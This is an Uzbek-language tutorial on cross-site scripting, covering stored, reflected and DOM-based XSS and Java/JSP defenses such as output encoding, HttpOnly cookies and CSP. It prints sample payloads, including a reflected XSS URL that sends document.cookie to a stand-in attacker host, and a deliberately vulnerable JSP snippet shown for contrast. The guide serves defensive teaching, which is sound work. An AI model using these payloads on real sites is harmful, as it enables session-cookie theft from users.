# XSS (Cross-Site Scripting) nima?

**XSS** (Cross-Site Scripting) — veb-ilovalardagi keng tarqalgan xavfsizlik zaifligi bo‘lib, hujumchiga foydalanuvchi brauzerida zararli JavaScript kodini ishga tushirish imkonini beradi. Bu zaiflik odatda foydalanuvchi tomonidan kiritilgan ma’lumotlar (masalan, forma maydonlari, URL parametrlari yoki sharhlar) to‘g‘ri sanitarizatsiya qilinmasa yoki filtrlanmasa yuzaga keladi. XSS hujumlari foydalanuvchi ma’lumotlarini o‘g‘irlash, veb-sahifalarni o‘zgartirish yoki boshqa zararli harakatlarni amalga oshirish uchun ishlatiladi.

Bu qo‘llanma XSS nima ekanligi, uning turlari, ta’sir oqibatlari, misollar va himoya usullarini batafsil tushuntiradi.

## XSS turlari

XSS hujumlari uchta asosiy turga bo‘linadi:

1. **Saqlanadigan XSS (Stored XSS)**:
   - Zararli skript serverda (masalan, ma’lumotlar bazasida) saqlanadi va har bir foydalanuvchi sahifaga kirganda ishga tushadi.
   - Misol: Hujumchi veb-saytning sharhlar bo‘limiga `<script>alert('Hujum!');</script>` kiritadi. Bu skript ma’lumotlar bazasida saqlanadi va har bir foydalanuvchi sharhlar sahifasini ochganda ishga tushadi.
   - Ta’sir: Barcha foydalanuvchilarga ta’sir qiladi, chunki skript serverda doimiy saqlanadi.

2. **Reflektiv XSS (Reflected XSS)**:
   - Zararli skript so‘rov (masalan, URL parametri) orqali yuboriladi va server uni to‘g‘ridan-to‘g‘ri javobga qaytaradi.
   - Misol: Hujumchi foydalanuvchiga `http://example.com/search?q=<script>alert('Hujum!');</script>` havolasini yuboradi. Foydalanuvchi havolani bosganda skript ishga tushadi.
   - Ta’sir: Faqat havolani bosgan foydalanuvchiga ta’sir qiladi.

3. **DOM-based XSS**:
   - Zararli skript brauzerda, DOM (Document Object Model) manipulyatsiyasi orqali ishga tushadi, serverga umuman yuborilmaydi.
   - Misol: JavaScript kodi URL parametrini (masalan, `document.location`) o‘qib, uni to‘g‘ridan-to‘g‘ri sahifaga qo‘shadi: `document.getElementById('content').innerHTML = document.location.search`.
   - Ta’sir: Faqat mijoz tomonida sodir bo‘ladi va serverdan mustaqil.

## XSS hujumlarining ta’sir oqibatlari

- **Ma’lumotlar o‘g‘irlashi**: Cookie’lar, sessiya tokenlari yoki boshqa maxfiy ma’lumotlar o‘g‘irlanadi.
- **Foydalanuvchi harakatlarini o‘zgartirish**: Foydalanuvchilarni soxta sahifalarga yo‘naltirish yoki ular nomidan harakatlar bajarish.
- **Veb-sahifa o‘zgartirish**: Sahifaga soxta kontent qo‘shish yoki foydalanuvchi tajribasini buzish.
- **Zararli dasturlarni tarqatish**: Foydalanuvchi brauzerida zararli dasturlarni ishga tushirish.

## XSS hujumiga misol

### Saqlanadigan XSS:
Foydalanuvchi veb-saytning sharhlar formasiga quyidagi kodni kiritadi:
```html
<script>alert('Sizning cookie’laringiz o‘g‘irlandi: ' + document.cookie);</script>
```
Agar server bu ma’lumotni filtrlamasa va ma’lumotlar bazasiga saqlasa, har bir sharhlar sahifasini ochgan foydalanuvchi bu skriptni ishga tushiradi. Hujumchi cookie’lar yoki boshqa ma’lumotlarni o‘g‘irlashi mumkin.

### Reflektiv XSS:
Hujumchi foydalanuvchiga quyidagi URL’ni yuboradi:
```
http://example.com/search?q=<script>document.location='http://hujumchi.com/steal?cookie='+document.cookie;</script>
```
Foydalanuvchi URL’ni bosganda, skript ishga tushadi va cookie’lar hujumchining saytiga yuboriladi.

## XSS dan himoya qilish usullari

XSS hujumlaridan himoya qilish uchun quyidagi usullarni qo‘llash tavsiya etiladi:

### 1. Kirish ma’lumotlarini sanitarizatsiya qilish
- Foydalanuvchi kiritgan ma’lumotlarni (forma maydonlari, URL parametrlari) to‘g‘ri filtrlang va sanitarizatsiya qiling.
- HTML maxsus belgilarini kodlash (encode) qiling:
  - `<` → `&lt;`
  - `>` → `&gt;`
  - `"` → `&quot;`
  - `&` → `&amp;`
- Java yoki Jakarta Servletlarda `org.owasp.encoder` yoki `ESAPI` kutubxonalaridan foydalaning:
  ```java
  import org.owasp.encoder.Encode;
  String userInput = req.getParameter("comment");
  String safeOutput = Encode.forHtml(userInput);
  ```

### 2. HTTP-only Cookie’lar
- Cookie’larda `HttpOnly` xususiyatini yoqing, bu JavaScript orqali cookie’ni o‘qishni bloklaydi:
  ```java
  Cookie cookie = new Cookie("sessionId", sessionId);
  cookie.setHttpOnly(true);
  resp.addCookie(cookie);
  ```

### 3. Secure Cookie’lar
- HTTPS ulanishlarida cookie’lar faqat shifrlangan holda uzatilishi uchun `setSecure(true)` ni yoqing:
  ```java
  cookie.setSecure(true);
  ```

### 4. Content Security Policy (CSP)
- Brauzerda faqat ruxsat berilgan manbalardan skriptlar ishga tushishini ta’minlash uchun CSP sarlavhalarini qo‘shing:
  ```java
  resp.setHeader("Content-Security-Policy", "script-src 'self'");
  ```
- Bu tashqi yoki noma’lum skriptlarning ishga tushishini bloklaydi.

### 5. Kirish ma’lumotlarini validatsiya qilish
- Foydalanuvchi kiritgan ma’lumotlarni qat’iy validatsiya qiling (masalan, faqat harf va raqamlarni qabul qilish).
- Masalan, sharh maydonida faqat matn ruxsat etilsa:
  ```java
  if (!userInput.matches("[a-zA-Z0-9\\s]*")) {
      throw new IllegalArgumentException("Faqat harf va raqamlar ruxsat etiladi");
  }
  ```

### 6. JavaScript’da xavfsiz DOM manipulyatsiyasi
- DOM-based XSS’ni oldini olish uchun `innerHTML` o‘rniga `textContent` yoki `innerText` ishlatish:
  ```javascript
  document.getElementById('content').textContent = userInput; // Xavfsiz
  // document.getElementById('content').innerHTML = userInput; // Xavfli
  ```

### 7. XSS filtr kutubxonalaridan foydalanish
- OWASP Java Encoder yoki ESAPI kutubxonalaridan foydalaning:
  ```java
  import org.owasp.esapi.ESAPI;
  String safeOutput = ESAPI.encoder().encodeForHTML(userInput);
  ```

### 8. Frameworklardan foydalanish
- Jakarta Server Faces (JSF), Spring MVC yoki boshqa zamonaviy frameworklar XSS’dan avtomatik himoya qiladi (masalan, avtomatik HTML encoding).
- JSP’da `c:out` tegi yordamida chiqishni kodlash:
  ```jsp
  <c:out value="${userInput}"/>
  ```

## XSS hujumiga misol va himoya

### Xavfli kod (JSP misoli):
```jsp
<% String comment = request.getParameter("comment"); %>
<p>Sharh: <%= comment %></p>
```
Agar foydalanuvchi `comment` sifatida `<script>alert('Hujum!');</script>` kiritsa, skript ishga tushadi.

### Xavfsiz kod:
```jsp
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<p>Sharh: <c:out value="${param.comment}"/></p>
```
Bu yerda `<c:out>` HTML maxsus belgilarini avtomatik kodlaydi, shuning uchun skript ishga tushmaydi.

### Servlet misoli (Xavfsiz):
```java
import jakarta.servlet.http.*;
import org.owasp.encoder.Encode;
import java.io.IOException;

public class CommentServlet extends HttpServlet {
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        String comment = req.getParameter("comment");
        String safeComment = Encode.forHtml(comment); // XSS dan himoya

        resp.setContentType("text/html");
        resp.getWriter().println("<p>Sharh: " + safeComment + "</p>");
    }
}
```

## Umumiy muammolar va ularni bartaraf etish

- **Kirish ma’lumotlari filtrlanmaydi**:
  - Har doim foydalanuvchi kiritgan ma’lumotlarni sanitarizatsiya qiling va validatsiya qiling.
- **Cookie’lar o‘g‘irlanadi**:
  - `HttpOnly` va `Secure` xususiyatlarini yoqing.
- **DOM-based XSS**:
  - JavaScript’da `innerHTML` dan qoching va `textContent` ishlatishni afzal ko‘ring.
- **Eski frameworklar**:
  - Agar eski JSP yoki servletlardan foydalansangiz, qo‘shimcha sanitarizatsiya qiling.

## Eng yaxshi amaliyotlar

1. **Har doim sanitarizatsiya qiling**: Foydalanuvchi kiritgan ma’lumotlarni HTML, JavaScript yoki SQL kontekstida ishlatishdan oldin kodlang.
2. **HTTP-only va Secure cookie’lar**: Barcha cookie’larda `setHttpOnly(true)` va `setSecure(true)` ni yoqing.
3. **CSP ishlatish**: Skriptlar faqat ruxsat berilgan manbalardan ishga tushishi uchun CSP sarlavhalarini qo‘shing.
4. **Frameworklardan foydalanish**: Zamonaviy frameworklar (Spring, JSF) avtomatik XSS himoyasini ta’minlaydi.
5. **Xavfsizlik sinovlari**: OWASP ZAP yoki Burp Suite kabi vositalar bilan ilovangizni XSS zaifliklari uchun sinab ko‘ring.
6. **Foydalanuvchi kiritishini cheklash**: Faqat kerakli ma’lumot turlarini qabul qiling (masalan, faqat raqamlar yoki harflar).

## Xulosa

XSS veb-ilovalarda keng tarqalgan va xavfli zaiflik bo‘lib, foydalanuvchi ma’lumotlarini o‘g‘irlash yoki ilova ishlashini buzish uchun ishlatiladi. To‘g‘ri sanitarizatsiya, HTTP-only cookie’lar, CSP va zamonaviy frameworklardan foydalanish orqali XSS hujumlarini oldini olish mumkin.
